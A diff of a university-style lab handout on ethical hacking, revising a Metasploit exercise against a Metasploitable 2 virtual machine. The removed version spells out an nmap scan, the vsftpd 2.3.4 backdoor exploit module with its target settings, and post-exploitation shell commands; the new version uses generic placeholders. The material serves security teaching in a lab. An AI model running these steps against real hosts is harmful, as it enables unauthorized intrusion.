@@ -1,78 +1,53 @@
-Experiment 2: Simulated Ethical Hacking with Metasploit
+Experiment: Simulated Ethical Hacking with Metasploit
+
 Objective
-To perform a safe exploitation exercise on a virtual machine using Metasploit and understand the basic stages of ethical hacking.
 
-Environment
-Kali Linux (Attacker)
-Metasploitable 2 (Victim/Test)
-VirtualBox or VMware
-Host-Only Adapter or Internal Network
+To perform a safe exploitation of a vulnerable virtual machine using Metasploit and understand the basic ethical hacking procedure.
+
 Procedure
-Step 1: Configure Virtual Machines
-Install Kali Linux and Metasploitable 2, configure both machines with a Host-Only Adapter or Internal Network, and boot both machines.
 
-Step 2: Verify Network Connectivity
-Check the IP address of Metasploitable 2 and verify connectivity from Kali Linux.
+Step 1: Start the Virtual Machines
+Start the Kali Linux and Metasploitable virtual machines and ensure they are connected to the same virtual network.
 
-On Metasploitable 2:
+Step 2: Identify the Target IP Address
+Determine the IP address of the Metasploitable machine using:
 
 ifconfig
-On Kali Linux:
 
-ping <Metasploitable_IP>
-Step 3: Perform Reconnaissance
-Scan Metasploitable 2 to identify open ports, services, and operating system details.
+Step 3: Scan the Target
+Use Nmap from Kali Linux to identify open ports and available services:
 
-nmap -sS -sV -O <Metasploitable_IP>
-Step 4: Save Nmap Results
-Save the scan results into a text file.
+nmap -sV <target-ip>
 
-nmap -sS -sV -O -oN metasploitable_scan.txt <Metasploitable_IP>
-Step 5: Launch Metasploit
-Start the Metasploit Framework.
+Step 4: Launch Metasploit Framework
+Open the Metasploit console in Kali Linux:
 
 msfconsole
-Step 6: Search for the Exploit
-Search for the vsftpd exploit.
 
-search vsftpd
-Step 7: Select the Exploit Module
-Select the vsftpd 2.3.4 backdoor exploit module.
+Step 5: Search for a Suitable Exploit
+Search the Metasploit database for an exploit corresponding to a vulnerable service on the target:
 
-use exploit/unix/ftp/vsftpd_234_backdoor
-Step 8: Set the Target Host
-Set the IP address of the Metasploitable 2 machine.
+search <service/vulnerability>
 
-set RHOST <Metasploitable_IP>
-Step 9: Set the Target Port
-Set the FTP service port.
+Step 6: Select and Configure the Exploit
+Select the required exploit and configure the target IP address:
 
-set RPORT 21
-Step 10: Execute the Exploit
-Execute the exploit against the Metasploitable 2 test machine.
+use <exploit>
+set RHOSTS <target-ip>
+
+Set the required options and verify the configuration.
+
+Step 7: Execute the Exploit
+Run the exploit against the authorized Metasploitable virtual machine:
 
 exploit
-Step 11: Verify the Shell and System Information
-Verify the command shell and gather basic system information.
 
-whoami
-uname -a
-ifconfig
-Step 12: Check Processes and Network Services
-View running processes and listening network services.
+Step 8: Verify the Result
+Observe the Metasploit output and verify whether a session was successfully established.
 
-ps aux
-netstat -tulnp
-Step 13: Create and View a Test File
-Create and view a test file on the target machine.
+Step 9: Close the Session
+After completing the demonstration, terminate the session and exit Metasploit.
 
-echo "This is a test file" > /tmp/test.txt
-cat /tmp/test.txt
 Result
-The target machine was scanned, a known vulnerable service was identified, and a controlled exploitation exercise was performed using Metasploit in the lab environment.
 
-Conclusion
-The experiment demonstrated the basic process of reconnaissance, exploitation, and post-exploitation using Nmap and Metasploit in a controlled virtual environment.
-
-Ethical Consideration
-This experiment should be performed only on the provided Metasploitable 2 test machine or another explicitly authorized lab environment.
+The exploitation of the vulnerable virtual machine was performed safely using Metasploit, demonstrating the basic ethical hacking and vulnerability exploitation process.
